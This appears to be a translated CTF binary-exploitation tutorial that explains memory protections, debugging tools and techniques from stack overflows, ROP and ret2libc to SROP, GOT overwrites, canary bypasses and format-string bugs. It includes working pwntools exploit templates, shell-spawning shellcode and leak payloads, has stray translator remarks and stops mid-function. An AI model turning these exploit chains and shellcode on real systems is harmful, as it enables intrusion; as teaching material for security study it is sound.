amd64-64-little: 64-bit little-endian ELF on x86-64 i386-32-little: 32-bit little-endian ELF on x86 NX: Non-eXecutable (data memory is not executable) disabled / Stack: Executable: you can run shellcode directly on stack/heap enabled: stack/heap cannot execute injected code PIE: Position Independent Executable. The main program does not rely on fixed absolute addresses; .text/.data/.bss/main addresses become base_addr + offset. When ASLR is enabled, the base address changes each run. No PIE: loaded at a fixed absolute address (tool-reported addresses match runtime) PIE enabled: randomized main binary base (runtime addresses = tool address + random base) RELRO: Read-Only Relocations. After relocations, relevant pages (especially GOT) become read-only. Full RELRO: .got and .got.plt fully read-only Partial RELRO: .got read-only, but .got.plt still writable No RELRO: no protection, both writable Stack: whether Stack Canary protection is enabled. The compiler inserts a random canary between locals and the return address; it is checked before returning. No canary found: no canary Canary found: canary enabled Stripped: whether symbols were stripped No: includes function names/symbols (easier reversing/debugging) Yes: stripped (harder reversing), but not a major runtime security feature Debuginfo: whether debug info (DWARF) is included No: typical release builds remove it Yes: source-level debug info is present, useful for debugging but may leak information Besides these, another protection that is enabled by default in most environments is: ASLR (Address Space Layout Randomization) This is an OS-level memory protection mechanism. Each time the program starts, the OS randomizes the base addresses of key regions in the process address space (such as stack, heap, shared libraries including libc, vdso, etc.), making actual code/data addresses unpredictable between runs. ToolsGet familiar with common tools. You can install them first; the concrete workflows can be revisited after you understand the vulnerabilities/exploitation methods and need the exact commands. GDBGDB (GNU Debugger) is a debugger mainly used for C/C++ programs. Install1sudo apt install gdb Install Pwndbgpwndbg is a GDB plugin that provides stack/heap/register context views and commands like cyclic, rop, heap, format, etc., making binary exploitation debugging much more efficient. Install: 12345678910# 1) dependenciessudo apt updatesudo apt install -y git python3-venv python3-pip# 2) clone into your home directorygit clone https://github.com/pwndbg/pwndbg ~/.local/share/pwndbgcd ~/.local/share/pwndbg# 3) run setup (creates a local venv and adds source to ~/.gdbinit)./setup.sh Before installation: After installation: Common Commands Open a binary in GDB 123gdb ./vuln# orgdb -q ./vuln -q: quiet mode, no startup banner. Or start GDB first and then load a file: 123gdbpwndbg&gt; file ./pwn Run the program 1234runrun &lt; input.txt # input from filerun &lt;&lt;&lt; &quot;AAAA&quot; # simple inline input View assembly 1234disassemble maindisass maindisassemble win Set breakpoints 12break mainb main View registers 1234info registersi rx/20gx $rsp # view stack (20 qwords from RSP) Search gadgets 12345rop --grep &quot;ret&quot;rop --grep &quot;pop rdi ; ret&quot;rop --grep &quot;pop rsi ; pop r15 ; ret&quot; Finding the Return Address Offset123456pwndbg&gt; | cyclic 1200 | tee /tmp/pat &gt; /dev/nullpwndbg&gt; run &lt; /tmp/pat# after crash:pwndbg&gt; x/gx $rsp # record the 8 bytes herepwndbg&gt; cyclic -n 8 -o 0x... # compute the offset using that value | cyclic 1200 | tee /tmp/pat &gt; /dev/null: generate a pattern and save it to a file cyclic 1200: generate a 1200-byte De Bruijn cyclic pattern (unique substrings; default n=4) tee /tmp/pat: write it into /tmp/pat &gt; /dev/null: suppress output x/gx $rsp: read the 8 bytes that will be popped into RIP by ret x (examine memory) /gx: show one 8-byte value in hex $rsp: use the current stack pointer cyclic -n 8 -o 0x...: compute the offset from the observed value -o (offset): “this is the 8-byte value I saw—where does it appear in the pattern?” -n 8: on 64-bit, we match 8 bytes (otherwise default n=4 may be wrong) 0x...: paste the hex value from x/gx $rsp Output: a decimal number like Found at offset 18 — this is the byte offset to the saved return address. Example 123456789pwndbg&gt; | cyclic 1200 | tee /tmp/pat &gt; /dev/nullpwndbg&gt; run &lt; /tmp/pat...pwndbg&gt; x/gx $rsp0x7fffffffd878: 0x6164616161616161pwndbg&gt; cyclic -n 8 -o 0x6164616161616161Finding cyclic pattern of 8 bytes: b&#x27;aaaaaada&#x27; (hex: 0x6161616161616461)Found at offset 18pwndbg&gt; So the offset is 18. IDA/GhidraMany challenges only provide a compiled binary, not source code. In that case, you need a decompiler to inspect pseudocode so you don’t have to struggle with raw assembly only. Download: IDA Free: https://hex-rays.com/ida-free IDA Pro is very expensive. A fully free open-source alternative is Ghidra. Ghidra: https://ghidralite.com/ PwntoolsPwntools is a Python library for CTF/Pwn. It provides remote connection utilities, payload building, packing/unpacking, gadget lookup, shellcode assembly, GDB integration, and more, enabling efficient exploit development. Install1pip3 install pwntools -U Common APIs (by task)1) Connection &amp; interaction (Assume io=) process(path) / remote(host, port): local/remote io.send(data) / io.sendline(data) io.recv(n) / io.recvline() / io.recvuntil(delim) io.sendafter(delim, data) / io.sendlineafter(delim, data): send after prompt io.clean(timeout=0.1): flush extra output io.interactive(): interactive shell mode (like nc), and prints buffered data when entered 2) Pack/unpack &amp; helper concatenation p32(x) / p64(x), u32(b) / u64(b): integer &lt;-&gt; bytes (little-endian) flat(*args, filler=b&#39;A&#39;, length=None): smartly packs inputs into a byte string based on context (arch/endian/word size), handling alignment and packing automatically. Examples: 123456789payload = flat(&#123; 0: shellcode, 256: JMP_RSI_Adress&#125;)payload = flat(&#123; 0: b&quot;A&quot;*84, 84: win_Adress&#125;) fit(&#123;offset: data, ...&#125;, filler=b&#39;A&#39;): place data at offsets cyclic(n) / cyclic_find(value, n=4/8): cyclic pattern and offset finding (pwndbg can do this too) 3) ELF &amp; ROP helpers ELF(path): parse symbols, plt/got, sections, etc. elf.symbols[]: get symbol addresses (functions/globals) elf.search(): search for a byte sequence; returns a generator elf.got[]: get GOT entry address elf.plt[]: get PLT stub address ROP(elf): auto-find gadgets / build ROP rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;]), rop.call(&#39;puts&#39;, [addr]), rop.chain() context.binary = elf: let pwntools infer architecture automatically 4) Shellcode / assembly asm(&#39;mov rax, 60; xor rdi, rdi; syscall&#39;) shellcraft.sh() / asm(shellcraft.sh()) disasm(b&#39;\\x90\\x90\\xcc&#39;) 5) Debugging gdb.attach(io, gdbscript=&#39;b *0x401234\\nc&#39;) gdb.debug([path], gdbscript=...) 6) Misc hexdump(data) log.info()/success()/warning() context.timeout = 2 pause() Template process is for local testing (binary path) remote is for connecting to the server 1234567891011121314151617from pwn import *context.update(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;) # x86-64 64-bit# context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) # x86 32-bitelf = ELF(&#x27;./vuln&#x27;, checksec=False)# r = process(&#x27;./vuln&#x27;)r = remote(&quot;Host&quot;, Port) r.recvuntil(b&#x27;:&#x27;)payload = b&quot;A&quot;*64 + b&quot;B&quot;*4 + p64()r.sendline(payload)r.interactive() RopgadgetUsed to find gadgets efficiently and accurately. Install: 1sudo apt install python3-ropgadget Usage: 1ROPgadget --binary ./vuln | grep -E &quot;pop rdi ; ret&quot; Vulnerabilities and Exploitation MethodsIn general, the core vulnerabilities in pwn challenges mainly fall into two broad categories: Unsafe input/bounds handling (leading to overflows, format string bugs, etc.) Logic/design/implementation flaws in state/privilege/lifecycle (e.g., classic Use-After-Free) We exploit these vulnerabilities to change the program’s control flow, in order to read the flag or get a shell. The following discussion is divided into three main parts: Overflows (mainly stack overflow) Format string vulnerabilities Heap exploitation Buffer OverflowA buffer overflow commonly occurs in input/copy routines that do not perform bounds checks or implement them incorrectly. It can overwrite adjacent data in the stack/heap/static regions (e.g., return addresses, function pointers, object metadata, etc.). There are many other overflow patterns as well (for example, out-of-bounds writes caused by integer overflow). If the overflow happens on the stack, it is called a stack overflow. A common exploitation approach is to overwrite stack-adjacent data such as the saved return address. (Definition of stack overflow: the program writes more bytes into a stack variable than the variable’s allocated size, causing adjacent stack values to be modified.) A simple common example: the program allocates a fixed-size buffer on the stack, but does not properly check input length, allowing us to write beyond the buffer and overwrite higher-address stack contents. Vulnerability / Common Dangerous Functions gets() No length limit/check at all. fgets(buf, size, stdin) If size is larger than the actual allocated size of buf, it can overflow.12char buf[32];fgets(buf, 128, stdin); scanf(&quot;%s&quot;, buf) %s reads until whitespace (space/newline/tab, etc.) Safer usage:1scanf(&quot;%15s&quot;, buf); // read at most 15 bytes + 1 &#x27;\\0&#x27; read(0, buf, count) If count is larger than the actual allocated size of buf, it can overflow.12char buf[32];read(0, buf, 0x100); Struct Field HijackingThe simplest goal is to modify a nearby variable. For example: 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;struct user &#123; char name[64]; int is_admin;&#125;;void win() &#123; printf(&quot;You are admin!\\n&quot;); system(&quot;/bin/flag&quot;);&#125;int main() &#123; struct user u; memset(&amp;u, 0, sizeof(u)); printf(&quot;Enter your name: &quot;); fgets(u.name, 200, stdin); // name is 64 bytes, fgets reads 200 bytes if (u.is_admin == 1) &#123; win(); &#125; else &#123; printf(&quot;Access denied.\\n&quot;); &#125; return 0;&#125; We write into u.name, but the input size limit is 200 while name is only 64 bytes. Since struct fields are contiguous in memory, we can input: 123&#x27;A&#x27;*64 + &#x27;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#x27;# or&#x27;A&#x27;*64 + p64(1) This overwrites is_admin with 1. (Most architectures are little-endian, and int is 4 bytes, so \\x01\\x00\\x00\\x00... makes sense.) ROP (Return Oriented Programming)ROP means overwriting the return address and placing a ROP chain on the stack. As the program repeatedly executes ret, it jumps through a sequence of gadgets ending in ret, combining existing instruction snippets from the program/library to achieve a desired flow (e.g., call system, trigger syscall, ORW to read a flag, etc.). Because we must overwrite the return address, we need the exact offset from our input start to the saved return address. Example layout: 123| buf | 0x20| saved RBP | 0x08| ret | So the offset is 0x28. Often you can read this from IDA’s stack frame view, but sometimes IDA’s offset is inaccurate and you must confirm via GDB. Then you can overwrite the return address: 1payload = b&quot;A&quot; * 0x28 + p64(fake_ret_addr) Note: if the overflow happens in function fun(), control returns to fake_ret_addr only after fun() finishes. The same idea applies to main()—it also has a return address. ret2textret2text means redirecting execution to code that already exists in the binary itself (i.e., code in the .text segment). This typically requires: 1Stack: No canary found If PIE is enabled, you must leak the binary base first and then compute real function addresses. Example (assume there is a win() function that calls system(&quot;/bin/sh&quot;) and requires no arguments): 123win_address = 0x0000000000401172payload = b&quot;A&quot; * offset_to_ret_addrpayload += p64(win_address) ret2shellcodeShellcodeShellcode is a short sequence of machine code (often written as bytes) used to exploit a vulnerability, often to spawn a shell. Common examples: 1. 123from pwn import *shellcode = asm(shellcraft.sh()) # /bin/sh 2. 123456789sc = asm(&quot;&quot;&quot; xor rsi, rsi xor rdx, rdx mov rbx, 0x68732f6e69622f push rbx mov rdi, rsp mov al, 59 syscall&quot;&quot;&quot;) 24-byte shellcode (source: https://www.exploit-db.com/exploits/43550 ): 12345678910111213141516171819202122232425262728/*global _startsection .text_start: push 59 pop rax cdq push rdx mov rbx,0x68732f6e69622f2f push rbx push rsp pop rdi push rdx push rdi push rsp pop rsi syscall*/#include &lt;stdio.h&gt;#include &lt;string.h&gt;char code[] = &quot;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05&quot;;int main()&#123; printf(&quot;len:%d bytes\\n&quot;, strlen(code)); (*(void(*)()) code)(); return 0;&#125; 23-byte shellcode (source: https://www.exploit-db.com/exploits/36858 ): 123456789101112131415161718192021222324252627282930/* .global _start_start: xorl %esi, %esi movq $0x68732f2f6e69622f, %rbx pushq %rsi pushq %rbx pushq %rsp popq %rdi pushq $59 popq %rax xorl %edx, %edx syscall */#include &lt;stdio.h&gt;#include &lt;string.h&gt;intmain(void)&#123; char *shellcode = &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56&quot; &quot;\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;; printf(&quot;strlen(shellcode)=%d\\n&quot;, strlen(shellcode)); ((void (*)(void))shellcode)(); return 0;&#125; ret2shellcoderet2shellcode means: during exploitation (e.g., via stack overflow), inject your shellcode into memory (commonly stack/heap/.bss) and then redirect control flow to that shellcode by overwriting the return address or using a jump gadget (like jmp *sp), so arbitrary instructions execute. First, only consider writing shellcode to the stack and executing it: This generally requires: 1234NX: NX enabledStack: No canary foundPIE: No PIE (0x400000) We discuss two cases: ASLR enabled/disabled. 1. ASLR enabled: 12345678910int main()&#123; char buf[0x30] = &#123; 0 &#125;; printf(&quot;%p\\n&quot;, buf); printf(&quot;&gt;&quot;); fflush(stdout); read(fileno(stdin), buf, 0x50); return 0;&#125; Assume we can obtain the stack address of buf (the program prints it here). We can build: 123from pwn import *sc = asm(shellcraft.sh())payload = sc.ljust(0x48, b&quot;A&quot;) + p64(buf_addr) We write shellcode into buf, then overwrite the return address to jump to buf. If we cannot directly leak buf, but buf’s address is stored in a register (e.g., rsi) and the program contains a gadget like jmp rsi, we can jump to it: 12345678910from pwn import *shellcode = asm(shellcraft.sh()) # /bin/shJMP_RSI = next(elf.search(asm(&#x27;jmp rsi&#x27;)))payload = flat(&#123; 0: shellcode, 256: JMP_RSI&#125;) 2. ASLR disabled: Since ASLR is off, after writing shellcode to the stack we can brute-force the stack address. If the payload is: 1[Shellcode] [Return Address] brute forcing is inefficient because you must hit the exact start address of the shellcode. To increase success rate, use a NOP sled. NOP means “No Operation”: it does nothing and just advances the instruction pointer. On x86, the most common NOP opcode is 0x90. If you place a long NOP sequence before the shellcode, you no longer need to return to the exact shellcode start—landing anywhere in the NOP sled will “slide” into the shellcode. Optimized structure: 1[Padding] [Return Address] [NOP] [Shellcode] or 1[NOP] [Shellcode] [Return Address] Then you can brute-force in steps roughly equal to the NOP sled length without missing it. Example: 1234567from pwn import *sc = asm(shellcraft.sh())NOP_len = 0x100NOP = b&#x27;\\x90&#x27; * NOP_lencode = NOP + scpayload = b&#x27;A&#x27;*0x38 + p64(addr_int) + code ret2pltret2plt means: overwrite the return address to jump into a function stub in the binary’s PLT, calling a function through the PLT/GOT mechanism. This is often used when the program already contains (or has resolved) system, and you can construct a ROP chain using existing functions/gadgets. We consider several cases: 1. Program has system, a &quot;/bin/sh&quot; string, and a pop rdi ; ret gadget. 1234567891011121314from pwn import *elf = context.binary = ELF(&#x27;./challenge&#x27;)pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))bin_sh = p64(0x400808) # address of &quot;/bin/sh&quot;ret = p64(next(elf.search(asm(&#x27;ret&#x27;, arch=&#x27;amd64&#x27;))))system = p64(elf.sym[&#x27;system&#x27;])payload = b&quot;A&quot;*(0xA+8) + pop_rdi + bin_sh + ret + system# ret is for stack alignment; sometimes needed, sometimes not If there is no &quot;/bin/sh&quot;, using &quot;sh&quot; usually works too. 123456pop_rdi = p64(next(elf.search(asm(&#x27;pop rdi ; ret&#x27;, arch=&#x27;amd64&#x27;))))sh = p64(next(elf.search(b&#x27;sh&#x27;)))ret = p64(next(elf.search(asm(&#x27;ret&#x27;, arch=&#x27;amd64&#x27;))))system = p64(elf.sym[&#x27;system&#x27;])payload = b&quot;A&quot;*(0xA+8) + pop_rdi + sh + ret + system 2. Program has system, pop rdi ; ret, and an input function (e.g., gets/read/scanf). 12345678910111213141516171819202122from pwn import *elf = context.binary = ELF(&#x27;./challenge&#x27;)sys_add = elf.plt[&#x27;system&#x27;]gets_add = elf.plt[&#x27;gets&#x27;]data_add = elf.bss() + 0x100 # add offset to avoid overwriting critical .bss datapop_rdi = next(elf.search(asm(&#x27;pop rdi ; ret&#x27;)))payload = b&quot;A&quot;*offset# call gets(data_add) to write &quot;/bin/sh&quot; into .bsspayload += p64(pop_rdi)payload += p64(data_add)payload += p64(gets_add)# second-stage ROP: system(data_add)payload += p64(pop_rdi)payload += p64(data_add)payload += p64(sys_add) ret2libcret2libc means: when you have a stack overflow but cannot execute injected shellcode (typically because NX/DEP), you hijack control flow into existing libc functions/strings (e.g., system(), /bin/sh) to execute commands. Typical workflow has two steps: Leak libc base Compute target function/gadget addresses and build a ROP chain 1. If ASLR is disabled on the server, you can brute-force libc base: 12345678910111213libc = ELF(&#x27;./libc-2.41.so&#x27;)for libc_base in range(0x7ffff7dff000,0x7ffff7d00000,-0x1000): system_addr = libc_base + libc.symbols[&#x27;system&#x27;] binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;)) rop_libc = ROP(libc) pop_rdi = libc_base + rop_libc.find_gadget([&#x27;pop rdi&#x27;,&#x27;ret&#x27;]).address ret = libc_base + rop_libc.find_gadget([&#x27;ret&#x27;]).address payload = b&#x27;A&#x27;*0x58 payload += p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr) Whether you need ret depends on stack alignment. 2. With ASLR enabled: Usually you leak a real function address, compute libc base, then compute other addresses. Example (assume you leaked printf): 1234567891011121314libc = ELF(&#x27;./libc-2.41.so&#x27;)libc_base = printf_addr - libc.symbols[&#x27;printf&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))rop_libc= ROP(libc)g_pop = rop_libc.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])g_ret = rop_libc.find_gadget([&#x27;ret&#x27;])POP_RDI = libc_base + g_pop.addressRET = libc_base + g_ret.addresspayload = b&#x27;A&#x27;*0x58payload += p64(POP_RDI) + p64(binsh_addr) + p64(RET) + p64(system_addr) ret2dlresolveret2dlresolve is a technique that abuses the dynamic linker’s lazy binding mechanism. Key advantage: no need to leak libc base. Even with ASLR enabled, as long as the binary does not use Full RELRO (so lazy binding still works), and you have a controllable stack overflow plus a writable known address region (e.g., .bss), you can forge a resolution request so the dynamic linker “resolves” system for you and calls it. Manual payload construction is very painful on 64-bit due to alignment and structure complexity. Fortunately pwntools provides Ret2dlresolvePayload. Exploit template: 123456789101112131415161718192021from pwn import *elf = context.binary = ELF(&#x27;./challenge&#x27;)rop_addr = elf.bss() + 0x100dlresolve = Ret2dlresolvePayload(elf, symbol=&quot;system&quot;, args=[&quot;/bin/sh&quot;])rop = ROP(elf)rop.read(0, dlresolve.data_addr, len(dlresolve.payload))rop.ret2dlresolve(dlresolve)raw_rop = rop.chain()payload = b&#x27;A&#x27; * offsetpayload += raw_roppayload += dlresolve.payloadr.sendline(payload)r.interactive() SROPSROP (Sigreturn Oriented Programming) relies on the Linux syscall rt_sigreturn (syscall number 15). When Linux handles a signal, the kernel saves the register context onto the stack as a SigreturnFrame. When the signal handler finishes, it uses rt_sigreturn to restore registers. Key point: rt_sigreturn blindly restores registers from the stack. So if we forge a SigreturnFrame on the stack and trigger syscall 15, the kernel will load attacker-controlled register values (e.g., for execve(&quot;/bin/sh&quot;)). (…code and diagrams below remain unchanged, since they are already in English/identifiers.) 12345678910111213141516171819202122global _startsection .text_start: ; [1] Leak Stage ; write(1, rsp, 8) mov rax, 1 mov rdi, 1 mov rsi, rsp mov rdx, 8 syscallvuln_read: ; [2] Overflow Stage ; read(0, rsp, 500) mov rax, 0 xor rdi, rdi mov rsi, rsp mov rdx, 500 syscall ret (…remaining SROP content preserved exactly as-is except Chinese text removed/translated:) Payload A: place a fake frame and return into read again. 12345678910+-----------------------+ &lt;-- Stack top (RSP)| Read_Addr | &lt;-- address of vuln_read (used as return address)+-----------------------+| 0 | &lt;-- padding+-----------------------+| || Fake SigreturnFrame | &lt;-- forged register context| (RAX=59, RDI=sh_addr)|| |+-----------------------+ Payload B: set RAX=15 and trigger syscall. 1234567+-----------------------+| Read_Addr | +-----------------------+ &lt;-- Stack top (RSP) - overwrites the first 15 bytes of Payload A| Syscall_Ret_Addr | &lt;-- address of syscall; ret+-----------------------+| Padding (7 bytes) | &lt;-- 7-byte padding+-----------------------+ After the second read, rax becomes 15 (because 15 bytes were read). The stack then looks like: 123456+-----------------------+ &lt;-- Stack top (RSP)| || Fake SigreturnFrame || (RAX=59, RDI=sh_addr)|| |+-----------------------+ So the CPU state is: RIP: points to syscall RAX: 15 (sys_rt_sigreturn) RSP: points to the start of the fake frame The kernel performs sys_rt_sigreturn and restores registers from our fake frame. 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *p = process(&#x27;./challenge&#x27;)elf = ELF(&#x27;./challenge&#x27;)vuln_read = elf.symbols[&#x27;vuln_read&#x27;]rop = ROP(elf)syscall_ret = rop.find_gadget([&#x27;syscall&#x27;, &#x27;ret&#x27;])[0]stack_addr = u64(p.recv(8))log.success(f&quot;Stack Address: &#123;hex(stack_addr)&#125;&quot;)frame = SigreturnFrame()frame.rax = 59 # execveframe.rdi = stack_addr + 8 + 8 + 40frame.rsi = 0frame.rdx = 0frame.rip = syscall_retframe.r8 = u64(b&#x27;/bin/sh\\x00&#x27;)payload_a = flat([ vuln_read, 0, bytes(frame)])p.send(payload_a)sleep(0.1)payload_b = flat([ syscall_ret, b&#x27;A&#x27; * 7])p.send(payload_b)p.interactive() FSOPFSOP (File Stream Oriented Programming) focuses on hijacking GLIBC’s file stream structure: _IO_FILE. What is _IO_FILE? On Linux, each file stream (stdin, stdout, stderr, or a file opened via fopen) corresponds to an _IO_FILE structure. For polymorphism, the structure ends with a vtable pointer. When the program calls fread, fwrite, fclose, etc., it dispatches through vtable function pointers. Before GLIBC 2.24, there was no strong validation for vtable. If we can control the contents of an _IO_FILE structure, we can redirect vtable to a fake table and make fclose jump to getshell. (…the rest of FSOP section is already in English/identifiers and kept as-is.) Control Flow HijackControl-flow hijacking means modifying the GOT/PLT resolution flow so that a call intended for fun1 actually calls fun2. Because GOT/PLT are at lower addresses than the stack, you generally cannot do this via stack overflow alone—you typically need heap overflow or an arbitrary write primitive. Example: 12345678910#define BUFSIZE 0x20uint32_t *array;int i;while (1)&#123; array = calloc(20, sizeof(*array)); // ... array[i] = atoi(buf); // ...&#125; If we can control i and buf, we can get an arbitrary write. If we already know the real address of system, we can overwrite atoi@got with system. Then atoi(buf) becomes system(buf), and sending &quot;/bin/sh&quot; gives a shell. If the program does not loop, you may overwrite some function used before exit to point back to main, forcing repeated runs. In short: control-flow hijacking often means overwriting GOT entries so the program “thinks” it is calling one function but actually calls another. This is more indirect than ROP and is commonly used in heap exploitation. Stack CanaryTo mitigate stack overflows, a defense called Stack Canary was invented. Name origin / history: Before modern sensors, miners feared invisible toxic gases like CO or methane. Canaries are extremely sensitive to toxic gas, so miners carried a canary cage as an alarm: If the bird kept singing, it was safe. If it stopped or collapsed, danger was near and they had to evacuate. In computing: The core idea of stack canaries is simple: place a random integer (the canary) between local variables (buffers) and control data (like the return address). Before returning, the program checks whether the canary value changed. In a typical linear overflow from low to high addresses, the attacker must overwrite the canary before reaching the return address. If the canary changes, the program terminates and the attack is blocked. A neat analogy: Real world (mining) Computing (stack) Mine Program stack Miner Return address Toxic gas Buffer overflow data Canary bird Canary value (random integer) Canary dies Canary is modified Evacuate Program terminates Stack layout with canary enabled: 123456789101112131415High Address ^ |+-----------------------+| Return Address |+-----------------------+| Saved Frame Pointer |+-----------------------+| Stack Canary | &lt;-- random value+-----------------------+| Local Variables | &lt;-- overflow source (buf)+-----------------------+ | vLow Address Also, on x86/x64 Linux (GCC/glibc), the least significant byte (LSB) of the canary is almost always forced to 0x00. Because x86/x64 is little-endian, that LSB is stored at the lowest address (closest to the buffer). This 0x00 helps: Anti-leak: string printing stops at \\0, so %s-style leaks stop before revealing the random bytes. Anti-overwrite with string ops: functions like strcpy stop at \\0, making certain precise overwrites harder (though read/memcpy can still overwrite past it). Canaries are effective against linear overflows, but there are bypass scenarios: If there is an information leak (format string, out-of-bounds read), you can leak the canary and rewrite it correctly. If there is an out-of-bounds write with index control, you can skip the canary and overwrite control data directly. If the server uses fork() per connection, canaries (and ASLR layout) are inherited from the parent process. All child processes share the same canary until the parent restarts, so you can brute-force the canary byte-by-byte via an oracle. If a main thread creates a worker thread (pthread), the thread’s stack and TLS may be adjacent, and in some cases you can overwrite both the stack canary and the TLS master canary to bypass checks (this is delicate and requires careful debugging). Format String VulnerabilityFirst, let’s clarify what a format string function is. Format String FunctionsA format string function accepts a variable number of arguments, and treats the first argument as the format string, which controls how subsequent arguments are parsed. Definition reference: The format string is a character string which contains two types of objects: plain characters, which are simply copied to the output channel, and conversion specifications, each of which causes conversion and printing of arguments. (Source: https://ocaml.org/manual/5.0/api/Printf.html) In exploitation, a format string situation typically has three components: a format string function the format string optional variables (arguments) Example: 1234567# include &lt;stdio.h&gt;int main(void)&#123; int i = 10; printf(&quot;%d\\n&quot;, i); return 0;&#125; Format String FunctionsThey can be input or output functions. Input: Function Description scanf() Reads from standard input Basic syntax: 1scanf(&quot;format string&quot;, &amp;var1, &amp;var2, ...); Example: 1234567891011# include &lt;stdio.h&gt;int main(void)&#123; int age; float height; char name[20]; scanf(&quot;%d %f %s&quot;, &amp;age, &amp;height, name); return 0;&#125; Note: scanf(&quot;%s&quot;, name); does not need &amp; because the array name is already an address. Output: Function Description printf Print to stdout (usually terminal) fprintf Print to a given stream (e.g., stderr, file pointer) sprintf Write formatted string into a buffer (risk of overflow) snprintf Write formatted string with max length (safer) asprintf Write to dynamically allocated buffer (GNU extension) dprintf Write to a file descriptor (POSIX) vprintf Like printf but uses va_list vfprintf Like fprintf but uses va_list vsprintf Like sprintf but uses va_list (unsafe) vsnprintf Like snprintf but uses va_list (recommended for safety) Format StringThe format string contains literal characters plus conversion placeholders. The syntax is: 1%[parameter][flags][field width][.precision][length]type Parameter: selects argument position (starting from 1) Token Meaning n$ n is the argument position Example: 12printf(&quot;%2$d %1$d&quot;, 11, 22);// outputs 22 11 Flags: Flag Meaning - left align + always show sign (space) leading space for positives 0 zero padding # alternate form (prefixes, decimal point behavior) Field width: minimum output width; * can take width from an argument. Example: 12345printf(&quot;%5d&quot;, 42);// outputs &quot; 42&quot;printf(&quot;%*d&quot;, 5, 42);// outputs &quot; 42&quot; Precision: digits after decimal (floats) or max length (strings); can use *. Length: integer/float size modifier: Modifier Meaning hh signed/unsigned char h short l long ll long long L long double z size_t t ptrdiff_t j intmax_t/uintmax_t Type: conversion specifier Spec Meaning %p pointer address %x hex integer %s string at an address %.2f float with 2 decimals %f float/double %c single char %d decimal integer %% print a literal % Only type is mandatory; others are optional. Example: 12345678910111213141516171819#include &lt;stdio.h&gt;int main() &#123; int i = 123; float pi = 3.14159; char letter = &#x27;A&#x27;; char name[] = &quot;hello&quot;; int hex = 255; printf(&quot;Integer: %d\\n&quot;, i); printf(&quot;Float (default): %f\\n&quot;, pi); printf(&quot;Float (2 decimals): %.2f\\n&quot;, pi); printf(&quot;String: %s\\n&quot;, name); printf(&quot;Char: %c\\n&quot;, letter); printf(&quot;Hex: %x\\n&quot;, hex); printf(&quot;Percent: %%\\n&quot;); return 0;&#125; Note: you must provide the variable arguments; otherwise printf reads unrelated memory and behavior is undefined. A special specifier is %n. It causes printf to write the number of characters printed so far into the given address. Example (normal usage): 1234567#include &lt;stdio.h&gt;int main() &#123; int n; printf(&quot;hello%n&quot;, &amp;n); return 0;&#125; Then n becomes 5. Because %n is dangerous, many modern environments restrict it or add checks (e.g., glibc format checks). But precisely because it is powerful, it is frequently used in pwn for memory writes. VariablesThe values you want to print. Format String VulnerabilityNormal behavior: printf reads the first argument as the format string and processes it: If the current character is not %, print it. If it is %, parse a conversion and consume the next argument accordingly. Example: 12345678910#include &lt;stdio.h&gt;int main() &#123; int a = 10; float b = 3.14f; char *str = &quot;hello&quot;; printf(&quot;Int: %d, Float: %f, String: %s\\n&quot;, a, b, str); return 0;&#125; How arguments are passed into printf (32-bit vs 64-bit)32-bit (cdecl): all on stack Varargs undergo default argument promotions: float becomes double, char/short become int. Typical stack layout: 1234567891011+------------------------------+| Return address |+------------------------------+| Format string pointer |+------------------------------+| Arg3 (str, 4B) |+------------------------------+| Arg2 (b, double, 8B) |+------------------------------+| Arg1 (a, 4B) |+------------------------------+ x86-64 (System V ABI): registers first, then stack First 6 integer/pointer args: RDI, RSI, RDX, RCX, R8, R9 First 8 floating args: XMM0–XMM7 (float promoted to double) Varargs additionally use a register save area and an overflow area; va_list fetches by type. For the example: RDI = format string RSI = a XMM0 = b (as double) RDX = str This is why offsets differ on 64-bit, and why %n$ positional parameters are often used. Special case and offset (bias) valueIf you call a format function but do not provide the extra arguments, e.g.: 123456#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello %x %x %x %x&quot;); return 0;&#125; printf still tries to fetch the missing arguments according to the ABI (stack on 32-bit, reg-save/overflow areas on 64-bit). Since those slots were never explicitly provided, it will print whatever residual/undefined data happens to be there. When this sequential fetching eventually reaches a region that contains your controlled marker (like AAAA...), the index of the slot where it first appears is commonly called the offset k. Then you can use %k$p, %k$s, %k$n to reliably reference that slot for leaking/writing. Common vulnerable patternTypical CTF pattern: 12345678#include &lt;stdio.h&gt;int main() &#123; char buf[100]; fgets(buf, sizeof(buf), stdin); printf(buf); // user input is treated as the format string return 0;&#125; This lets you leak stack values (variables, return addresses, etc.) and possibly write via %n. Exploit TechniquesReading stack contents1printf(&quot;%x %x %x&quot;); 1printf(&quot;%p %p %p&quot;); %x: print stack values as hex integers %p: print stack values as pointers (addresses) 12payload = b&quot;%p &quot; * 40payload = b&quot;%x &quot; * 40 Or use positional parameters: 1payload = &quot;%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p&quot; 1payload = &quot; &quot;.join([f&quot;%&#123;i&#125;$p&quot; for i in range(1, 61)]).encode() Reading a string at an arbitrary address %s: treats the stack value as a pointer and prints bytes until \\0. If a stack parameter contains: 10x08049000 -&gt; points to &quot;HelloWorld&quot; Then %x/%p prints the pointer value, while %s prints the string. Typical workflow Find the offset S:send something like AAAA,%p,%p,%p... and locate the position where 0x41414141 appears. Build a payload: If you know the offset and the target address (e.g., flag address), you can read it: 123def fmt_read_addr_payload(offset, addr, k=1): fmt = 